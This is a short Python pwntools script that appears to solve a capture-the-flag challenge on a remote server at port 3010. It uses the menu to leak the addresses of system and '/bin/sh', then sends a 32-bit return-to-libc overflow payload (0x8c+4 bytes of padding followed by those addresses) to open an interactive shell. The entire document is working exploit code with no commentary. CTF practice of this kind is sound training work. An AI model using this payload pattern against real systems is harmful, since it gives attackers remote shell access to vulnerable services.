from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3010)

r.recv()

# make money
r.sendline("2")
r.sendline("4")

# get system
r.sendline("3")
r.recvuntil("0x")
system = int(r.recvline().strip(),16)
print("system : ", hex(system))

# get binsh
r.sendline("4")
r.recvuntil("0x")
binsh = int(r.recvline().strip(),16)
print("binsh : ", hex(binsh))

dummy = b"A"*(0x8c+4)
payload  = dummy
payload += p32(system)
payload += b"AAAA"
payload += p32(binsh)

r.sendline("5")
print(r.recv())
r.sendline(payload)

r.interactive()